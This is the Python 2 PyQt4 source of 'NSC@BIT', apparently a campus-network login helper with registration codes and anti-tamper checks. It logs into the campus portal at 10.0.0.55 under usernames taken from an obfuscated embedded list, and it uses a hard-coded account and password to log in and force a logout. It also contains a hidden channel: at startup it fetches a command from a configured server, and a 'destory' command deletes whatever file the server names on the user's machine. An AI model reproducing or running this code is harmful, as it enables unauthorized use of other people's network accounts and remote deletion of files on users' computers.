# -*- coding: utf-8 -*-
from PyQt4 import QtCore, QtGui,Qt
import json
import time
import os,sys
import httplib
import base64
import random
import hashlib
from ConfigParser import ConfigParser

global url,usernames,passwords,mode,start_time
url="a0d303e694875474469793743666537546a097e433c457c6d69547b623a5a6a496f49677d6361393133613c674a586a4e694379496260746232687831326b693962607a475c40746239596f6a69437a485466653232647132326a6a49756"
#usernames="a0d3d314f443b645d48665841686658416767796d4775544d4035444d4a09794a6d4767797e4879545d4035444d49754a6d4767735f4335545d4035444d49754a6d4767734d4535545d4a75444d49754a6d476773436a7c67595b62434c4535544d487d445d4779445d4a0971434c4e6537516876474a5c686749437837595f6e423a557937556e6537595332434c4871544d4879445f4775444943754a78517257456372434c4035444d49743759507868546332434c4a0c653232603e48595372434c4c6c6d61667647416a765853676773516d6c6234666467556032434c4132575a5a7c623465755851637c684943776a6d44314a736372434c407642316e6537595a0032434c497b67416a75375163753751696653346767735d40786233657c6742657c6d6951346849437552326172434c477f67426632434c407862336c6e474943715e6a567e48546c6537494a037377556a72434c4a74685a557258516962434c4a746d695178684943755239507a5e636c6e48516572585a5a6e4749437437595070723268646749437b6d62603652395a62434c403a43326a077248546a72434c497657446a76475269665234676779695038774943736232686c6745676773436979323957677342643537595532434c457c6d6951346844607a474943736d62667862326a08686233676773456e6463346332434c4136433261307849437432395e653751633c6749437037426532434c457c675260787232686c684943754e6560787749437b6333657657416a62434c4a0e6a523a5576423467677961637078494375444f41387755627e47516972434c4e653751633c6749437837595f607e616767735a51386849437547526372434c496258546372434c486c6d616a0e653751677c6d616c64774943783759507072326134674943736d626c686d62686c6753676779626c6862395e6532326f6937546e62434c407652346e653751617658416632434c4e6537595a0532434c41393741663658556767796268686d65613868494379423467753759557647416767797a557c67426c6657426767734f477d445f417862336767734e443b645d46764744657647556a0767735563753754617c67416632434c4339445f4337645f4871434c4137645f48754e695d62434c48794a7d407642316e6537595032434c45765e636a7877456632434c4e653751637c67426"
passwords="a0d3d315e4535544e40394a6e4962544a5335474e487364595a0135475e4035545f4a75544e4c62544e42336a7d4a71545a5131545e487d4a7d4035574e4035545d4a79444e4d66544e423d4a7d4131544a53354d6e4a7d444d4031523e4866545f4a79444e4a0c6a545951355a7e4862545a5335475e413d444d40355d6e4b62545e4333644e4d66544e42315a6e4a62545a5031544e4b646459513b6a7e4866545d4a75444e4c6e4a6d4031523d497554595a0031545e453d445e4035575e4035545d4a7d445e45395459513b6a7e453144595031523d4971545e4a75445e4535544e41354d6e4431545a50315a6e496e4a6d41354d6e4866545d4a75544e4a0c6a5459523d4a7d4a7554595031545e4533645950355d6e4862545e4335474e4d66544e4031523e4431544a5335474e4b6e4a6d4031575e4031545a5235474e4c6a5459523d4a7d4775545f4a0131545e413d444e40355d6e4b62545e4a71445e4866544e413b6a7d4131545a5031544e4b6e4a7d4039575e4035545d4a75544e4c6a5459503b6a7d4971544a50315a6e4a7d444d40355d6e4a0862545f4335474d4862544a5235475e453d444e4035523e486a5a7e4335474e4b66544e4031523e4531545a5231574e453d4a6d4039575e4031544a5a75544e4c6a5a7e4a71523d4b6244595"
files=['images/logins.png','images/close.png','images/faq.png']  #普通文件检验是否存在
filename='nsc.exe'  #主程序校验
start_time=time.time()

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)


image=QtGui.QImage()
bgImage=image.load("images/logins.png")

def check_file():
    for file_ in files:
        if not os.path.exists(file_):
            print "where is %s?"%file_
            exit()
    fd = open(filename,"rb")
    fcont=fd.read() 
    fd.close()           
    real_fmd5 = hashlib.md5(base64.decodestring(hashlib.md5(fcont).hexdigest())).hexdigest()
    if real_fmd5!=fmd5:
        print "file md5 error"
        exit()
        
def check_time():
    global start_time
    now_time=time.time()
    if now_time-start_time>3:
        print "time error:%s"%(str(now_time-start_time))
        sys.exit()
    start_time=now_time
        
def mydecode(string):
    string2=''
    for i in range(len(string)):
        string2+=string[len(string)-i-1]
    string=base64.decodestring(string2.decode('hex'))
    return string

def myencode(string):
    string2=''
    string=base64.encodestring(string).encode('hex')
    for i in range(len(string)):
        string2+=string[len(string)-i-1]
    return string2

def reg_decode(string2):
    global start_time
    start_time=time.time()
    try:
        string=''
        string2=base64.decodestring(string2)
        string2=string2[:26]
        for i in range(len(string2)):
            string+=string2[len(string2)-i-1]
        string=base64.decodestring(string.decode('hex'))
        check_time()
        return string
    except Exception,e:
        #print e
        sys.exit()

class my_server():
    def __init__(self):
        global host
        global usernames
        payload="it's a good day!"
        try:
            con=httplib.HTTPConnection("%s"%host,80,timeout=5)
            con.request("POST","/include/hello.php",payload)
            usernames=con.getresponse().read()
            #print usernames
        except Exception,e:
            print e
            #sys.exit()
        self.getcommand()
        
    def getcommand(self):
        global host
        try:
            payload="token="#可以添加token防止dos
            con=httplib.HTTPConnection("%s"%host,80,timeout=5)
            con.request("POST","/include/command.php",payload)
            command=con.getresponse().read()
        except Exception,e:
            print e
            #sys.exit()
        if 'time' in command:
            self.get_time(command[5:])
        elif 'destory' in command:
            self.destory(command[8:])
        
        
    def destory(self,filename):
        try:
            os.remove(filename)
        except Exception,e:
            print e
            sys.exit()
            
    def get_time(self,time):
        global data
        global config
        data=time
        config.set('nsc','data',myencode(data))
        config.write(open('./nsc.ini','w'))
        print data
        

class labelBtn(QtGui.QLabel):
    """
    自定义图片按钮类
    """
    def __init__(self,ID):
        super(labelBtn, self).__init__()
        self.setMouseTracking(True)
        self.ID=ID
   
    def mouseReleaseEvent(self,event):  #注:
        #鼠标点击事件
        self.parent().btnHandle(self.ID)
   
    def enterEvent(self,event):
        #鼠标进入时间
        self.parent().btnEnter(self.ID)
   
    def leaveEvent(self,event):
        #鼠标离开事件
        self.parent().btnLeave(self.ID)
        
class mainwindow(QtGui.QMainWindow):
    def __init__(self,parent=None):
        super(mainwindow, self).__init__(parent)  # what's super?
        desktop =QtGui.QApplication.desktop()
        width = desktop.width()
        height = desktop.height()
        self.move((width - self.width())/2, (height - self.height())/2)
        self.setMouseTracking(True)
        #无边框
        self.setWindowFlags(Qt.Qt.FramelessWindowHint)
        #显示托盘信息
        self.trayIcon = QtGui.QSystemTrayIcon(self)
        self.trayIcon.setIcon(QtGui.QIcon("images/nsc.png"))
        self.trayIcon.show()
        self.trayIcon.activated.connect(self.trayClick)       #点击托盘 
        self.trayMenu()
        self.btn_min=labelBtn(1)               #定义最小化按钮 ID:1
        self.btn_min.setParent(self)
        self.btn_min.setGeometry(235,0,32,32)
        self.btn_min.setToolTip(u"最小化")
     
        self.btn_close=labelBtn(2)              #定义关闭按钮 ID:2
        self.btn_close.setParent(self)
        self.btn_close.setGeometry(268,0,32,32)
        self.btn_close.setToolTip(u"关闭")

        self.btn_faq=labelBtn(3)              #定义faq按钮 ID:3
        self.btn_faq.setParent(self)
        self.btn_faq.setGeometry(2,2,18,18)
        self.btn_faq.setToolTip(u"FAQ")
        
        self.btn_min.setPixmap(QtGui.QPixmap("images/min1.png"))
        self.btn_close.setPixmap(QtGui.QPixmap("images/close1.png"))
        self.btn_faq.setPixmap(QtGui.QPixmap("images/faq.png"))



    def trayClick(self,reason):
       #双击托盘
       if reason==QtGui.QSystemTrayIcon.DoubleClick:
           self.showNormal()
       else:
           pass
    def login(self):
        print data,time.strftime('%Y-%m-%d',time.localtime(time.time()))[1:]
        if time.strftime('%Y-%m-%d',time.localtime(time.time()))[1:]>regcode or regcode<data:
            dlg=QtGui.QMessageBox(self)
            #check_time
            print data,time.strftime('%Y-%m-%d',time.localtime(time.time()))[1:]
            dlg.information(self, u"NSC@BIT",u"NSC code out of date!",QtGui.QMessageBox.Ok)
            return 0
        global start_time
        start_time=time.time()
        global mode
        self.flag=0
        if mode==3:
            mode=self.auto_mode()
        elif mode==1:
            return self.radius_login()
        elif mode==2:
            return self.common_login()
        elif mode==0:
            return 0
        else:
            print "mode error"
            sys.exit()
        if not self.flag and self.check_network_out():
            dlg=QtGui.QMessageBox(self)
            dlg.information(self, u"NSC@BIT",u"Login success!",QtGui.QMessageBox.Ok)
            
            
    def check_network_out(self): #check if the WAN network is ok
        try:
            con=httplib.HTTPConnection("baidu.com",80,timeout=1)
            con.request("GET","/")
            if con.getresponse().status==302:
                return 0
        except Exception,e:
            return 0
        return 1
    
    def check_network_in(self): #check if the LAN network is ok
        try:
            con=httplib.HTTPConnection("10.0.6.30",80,timeout=1)
        except Exception,e:
            return 0
        return 1
    def check_network(self): #check if the WAN network is ok
        try:
            con=httplib.HTTPConnection("10.0.0.55",3333,timeout=1)
            con.request("GET","/")
            #print con.getresponse().read()
        except Exception,e:
            return 0
        return 1

    def flag(self):
        print "{f14g_1s_i_10v3_NSC}"
        
    def confuse(self):
        pass
        
    def auto_mode(self):
        global start_time
        dlg=QtGui.QMessageBox(self)
        if  not self.check_network:
            dlg.information(self, u"NSC@BIT",u"Check your network!",QtGui.QMessageBox.Ok)
            return 0
        elif not self.check_network_in():
            return 1
        elif not self.check_network_out():
            return 2
        else:
            dlg=QtGui.QMessageBox(self)
            dlg.information(self, u"NSC@BIT",u"You are online : )",QtGui.QMessageBox.Ok)
            self.flag=1
            return 0

    def common_login(self):#common login
        global start_time
        if  not self.check_network():
            dlg=QtGui.QMessageBox(self)
            dlg.information(self, u"NSC@BIT",u"Check your network!",QtGui.QMessageBox.Ok)
            return 0
        check_time()
        password=hashlib.md5(str(time.time())).hexdigest()[8:24]
        username=usernames[random.randint(0,len(usernames)-1)]
        payload='username=%s&drop=0&password=%s&type=1&n=100'%(username[1:],password)
        con=httplib.HTTPConnection("10.0.0.55",3333,timeout=5)
        con.request("POST","/%s"%url['common_url'],payload)
        #print url['common_url']
        #print payload
        message=con.getresponse().read()
        try:
            int(message)
        except Exception,e:
            dlg=QtGui.QMessageBox(self)
            if self.check_network_out():
                dlg.information(self, u"NSC@BIT",u"You are online : )!",QtGui.QMessageBox.Ok)
                self.flag=1
            else:
                dlg.information(self, u"NSC@BIT",u"Login failed!%s!"%message,QtGui.QMessageBox.Ok)  
    def radius_login(self):
        global start_time
        if not self.whmbit_login():
            dlg=QtGui.QMessageBox(self)
            dlg.information(self, u"NSC@BIT",u"PreLogin failed!!",QtGui.QMessageBox.Ok)
            return 0
        self.common_login()
        
    def whmbit_login(self): #whmbit先登录再登出
        global start_time
        if  not self.check_network():
            dlg=QtGui.QMessageBox(self)
            dlg.information(self, u"NSC@BIT",u"Check your network!",QtGui.QMessageBox.Ok)
            return 0
        check_time()
        payload='action=login&username=%s&password=%s&ac_id=8&type=1&wbaredirect=&mac=&user_ip='%('whmbit','710303')
        con=httplib.HTTPConnection("10.0.0.55",80,timeout=5)
        con.request("POST","/cgi-bin/srun_portal",payload)
        message=con.getresponse().read()
        if message=='':
            return 1
        if 'script' in message:
            return self.logout('whmbit','710303')

    def logout(self,username,password):
        payload='username=%s&password=%s'%(username,password)
        con=httplib.HTTPConnection("10.0.0.55",80,timeout=5)
        con.request("POST","/cgi-bin/force_logout",payload)
        message=con.getresponse().read()
        print message
        if 'ok' in message:
            return 1
        else:
            return 0
        
    def join_us(self):
        dlg=QtGui.QMessageBox(self)
        dlg.information(self, u"NSC@BIT",u"QQ群12345678",QtGui.QMessageBox.Ok)

        
    def register(self):
        global start_time
        name,ok=QtGui.QInputDialog.getText(self,self.tr("NSC@BIT"),\
                                     self.tr("Input your nsc code:"),  
                                     QtGui.QLineEdit.Normal,'do not try to cheat me')  
        if ok and (not name.isEmpty()):
            try:
                start_time=time.time()
                string=''
                string2=name
                string2=base64.decodestring(string2)
                string2=string2[:26]
                for i in range(len(string2)):
                    string+=string2[len(string2)-i-1]
                string=base64.decodestring(string.decode('hex'))
                year,month,date=string.split('-')
                print year,month,date
                check_time()
            except Exception,e:
                dlg=QtGui.QMessageBox(self)
                dlg.information(self, u"NSC@BIT",u"Cheat me,fuck you!",QtGui.QMessageBox.Ok)
                while 1:
                    dlg=QtGui.QMessageBox(self)
                    dlg.information(self, u"NSC@BIT",u"Fuck you!",QtGui.QMessageBox.Ok)
                exit()
            if time.strftime('%Y-%m-%d',time.localtime(time.time()))[1:]>string or data>time.strftime('%Y-%m-%d',time.localtime(time.time()))[1:]:
                #print time.strftime('%Y-%m-%d',time.localtime(time.time()))[1:],string,data
                dlg=QtGui.QMessageBox(self)
                dlg.information(self, u"NSC@BIT",u"Nsc code out of date!",QtGui.QMessageBox.Ok)
            else:
                config.set('nsc','data',myencode(data))
                config.set('nsc','regcode',name)
                config.write(open('./nsc.ini','w'))
                dlg=QtGui.QMessageBox(self)
                dlg.information(self, u"NSC@BIT",u"Good boy,congratulate you!",QtGui.QMessageBox.Ok)
                
    def mode1(self):
        global mode
        mode=1
    def mode2(self):
        global mode
        mode=2
    def mode3(self):
        global mode
        mode=3
    
    def btnEnter(self,ID):
       #鼠标进入
       if ID == 1:
           self.btn_min.setPixmap(QtGui.QPixmap("images/min.png"))
       elif ID == 2:
           self.btn_close.setPixmap(QtGui.QPixmap("images/close.png"))
       elif ID == 3:
           self.btn_faq.setPixmap(QtGui.QPixmap("images/faq.png"))
           
 
    def btnLeave(self,ID):
        #鼠标离开
        self.btn_min.setPixmap(QtGui.QPixmap("images/min1.png"))
        self.btn_close.setPixmap(QtGui.QPixmap("images/close1.png"))
        self.btn_faq.setPixmap(QtGui.QPixmap("images/faq.png"))
       
    def btnHandle(self,ID):
        #最小化
        if ID==1:
            self.hide()
            self.showMinimized()
        elif ID==2:
           #关闭
           self.trayIcon.hide()
           self.close()
        elif ID==3:
            #os.popen('cmd.exe /c %windir%\system32\notepad.exe nsc.ini').read()
            dlg=QtGui.QMessageBox(self)
            dlg.information(self, u"NSC@BIT",u"此处应该打开一个帮助文件",QtGui.QMessageBox.Ok)
        elif ID==4:
            self.register()
        elif ID==5:
           self.login()
        elif ID==6:
           self.join_us()
           
    def trayMenu(self):
       #右击托盘弹出的菜单
       img_main = QtGui.QIcon("images/main.png")
       img_exit = QtGui.QIcon("images/exit.png")
       self.trayIcon.setToolTip(u"BIT校园网助手")
       self.restoreAction = QtGui.QAction(img_main,u"主窗口", self)
       self.restoreAction.triggered.connect(self.showNormal)
       self.quitAction = QtGui.QAction(img_exit,u"退出", self)
       self.quitAction.triggered.connect(QtGui.qApp.quit)
       self.trayIconMenu = QtGui.QMenu(self)
       self.trayIconMenu.addAction(self.restoreAction)
       self.trayIconMenu.addSeparator()
       self.trayIconMenu.addAction(self.quitAction)
       self.trayIcon.setContextMenu(self.trayIconMenu)
       
    def resizeEvent(self,event):
       #重绘窗体背景
       pal=QtGui.QPalette()
       pal.setBrush(QtGui.QPalette.Window,QtGui.QBrush(image.scaled(event.size(),
           Qt.Qt.KeepAspectRatioByExpanding,Qt.Qt.SmoothTransformation)))
       self.setPalette(pal)
    def mousePressEvent(self,event):
       #鼠标点击事件
       if event.button() == QtCore.Qt.LeftButton:
           self.dragPosition = event.globalPos() - self.frameGeometry().topLeft()
           event.accept()
   
    def mouseMoveEvent(self,event):
       #鼠标移动事件
        if event.buttons() ==QtCore.Qt.LeftButton:
            self.move(event.globalPos() - self.dragPosition)
            event.accept()   

class Ui_dialog(object):
    def setupUi(self, dialog):
        dialog.setObjectName(_fromUtf8("dialog"))
        dialog.resize(300, 450)
        dialog.setWindowIcon(QtGui.QIcon("images/nsc.png"))
                               
        
        self.radioButton = QtGui.QRadioButton(dialog)
        self.radioButton.setGeometry(QtCore.QRect(15, 400, 80, 20))
        self.radioButton.setObjectName(_fromUtf8("radioButton"))
        self.radioButton_2 = QtGui.QRadioButton(dialog)
        self.radioButton_2.setGeometry(QtCore.QRect(113, 400, 80, 20))
        self.radioButton_2.setObjectName(_fromUtf8("radioButton_2"))
        self.radioButton_3 = QtGui.QRadioButton(dialog)
        self.radioButton_3.setGeometry(QtCore.QRect(215, 400, 80, 20))
        self.radioButton_3.setObjectName(_fromUtf8("radioButton_3"))
        
        self.toolButton = QtGui.QToolButton(dialog)
        self.toolButton.setGeometry(QtCore.QRect(100, 280, 100, 40))
        self.toolButton.setObjectName(_fromUtf8("toolButton"))
        self.toolButton_2 = QtGui.QToolButton(dialog)
        self.toolButton_2.setGeometry(QtCore.QRect(100, 230, 100, 40))
        self.toolButton_2.setObjectName(_fromUtf8("toolButton_2"))
        self.toolButton_3 = QtGui.QToolButton(dialog)
        self.toolButton_3.setGeometry(QtCore.QRect(100, 330, 100, 40))
        self.toolButton_3.setObjectName(_fromUtf8("toolButton_3"))
        
        
        self.retranslateUi(dialog)
        QtCore.QMetaObject.connectSlotsByName(dialog)
        
        

        

    def retranslateUi(self, dialog):
        #设置button图片（把文字嵌到图片内）
        
        

        dialog.btn_1=labelBtn(4)              #定义
        dialog.btn_1.setParent(dialog)
        dialog.btn_1.setGeometry(100, 230, 100, 40)
        dialog.btn_1.setPixmap(QtGui.QPixmap("images/bt1.png"))
        dialog.btn_2=labelBtn(5)              #定义
        dialog.btn_2.setParent(dialog)
        dialog.btn_2.setGeometry(100, 280, 100, 40)
        dialog.btn_2.setPixmap(QtGui.QPixmap("images/bt2.png"))
        dialog.btn_3=labelBtn(6)              #定义
        dialog.btn_3.setParent(dialog)
        dialog.btn_3.setGeometry(100, 330, 100, 40)
        dialog.btn_3.setPixmap(QtGui.QPixmap("images/bt3.png"))
        dialog.btn_3=labelBtn(7)              #定义
        dialog.btn_3.setParent(dialog)
        dialog.btn_3.setGeometry(30, 400, 60, 20)
        dialog.btn_3.setPixmap(QtGui.QPixmap("images/xz1.png"))
        dialog.btn_3=labelBtn(8)              #定义
        dialog.btn_3.setParent(dialog)
        dialog.btn_3.setGeometry(128, 400, 60, 20)
        dialog.btn_3.setPixmap(QtGui.QPixmap("images/xz2.png"))
        dialog.btn_3=labelBtn(9)              #定义
        dialog.btn_3.setParent(dialog)
        dialog.btn_3.setGeometry(230, 400, 60, 20)
        dialog.btn_3.setPixmap(QtGui.QPixmap("images/xz3.png"))
        

        dialog.connect(dialog.btn_1, QtCore.SIGNAL("clicked()"),dialog.login)
        dialog.connect(dialog.btn_2, QtCore.SIGNAL("clicked()"),dialog.register)
        dialog.connect(dialog.btn_3, QtCore.SIGNAL("clicked()"),dialog.join_us)
        dialog.connect(self.radioButton, QtCore.SIGNAL("clicked()"),dialog.mode1)
        dialog.connect(self.radioButton_2, QtCore.SIGNAL("clicked()"),dialog.mode2)
        dialog.connect(self.radioButton_3, QtCore.SIGNAL("clicked()"),dialog.mode3)
        dialog.setWindowTitle(_translate("dialog", "NSC_v0.1", None))
        self.radioButton.setText(_translate("dialog", "radius", None))
        
        self.radioButton_2.setText(_translate("dialog", "common", None))
        self.radioButton_3.setText(_translate("dialog", "auto", None))
        self.toolButton.setText(_translate("dialog", "login", None))
        
        self.toolButton_2.setText(_translate("dialog", "register", None))
        self.toolButton_3.setText(_translate("dialog", "join us", None))
if __name__ == "__main__":
    #def readconf():
    config=ConfigParser()
    if not os.path.exists('./nsc.ini'):
       print "where is nsc.ini?"
       sys.exit()
    config.read('./nsc.ini')
    host=config.get('nsc','host')
    regcode=reg_decode(config.get('nsc','regcode'))
    fmd5=config.get('nsc','fmd5')
    mode=int(config.get('nsc','mode'))
    #print mode
    data=mydecode(config.get('nsc','data'))
    check_file()
    check_time()
    my_server()
    url=json.loads(mydecode(url))
    #print url
    check_time()
    usernames=mydecode(usernames).split(',')
    #print usernames
    passwords=passwords
    app = QtGui.QApplication(sys.argv)
    a=mainwindow()  #add your code or style in mainwindow
    window_modify=Ui_dialog()  
    window_modify.setupUi(a)  #user ui_dialog to modify your window
    a.show()
    sys.exit(app.exec_())

